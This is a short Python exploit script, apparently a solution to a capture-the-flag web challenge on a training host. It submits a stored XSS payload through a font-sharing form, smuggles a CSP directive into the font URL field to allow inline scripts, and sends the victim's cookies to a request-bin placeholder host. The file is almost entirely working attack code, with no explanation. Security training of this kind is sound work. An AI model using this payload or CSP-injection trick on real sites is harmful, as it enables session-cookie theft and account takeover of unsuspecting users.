import requests

base_url = "http://fonts.training.offdef.it/"

def share(text, font_name, font_url):
    url = base_url + "share"
    data = {
        "text": text,
        "font_name": font_name,
        "font_url": font_url
    }
    requests.post(url, data=data)

text = "<img src onerror=window.location.href='{SOME.REQUEST.BIN}/?cookie='+document.cookie>"
font_name = "XSS is cool"
font_url = "; script-src-attr 'unsafe-inline'"

share(text, font_name, font_url)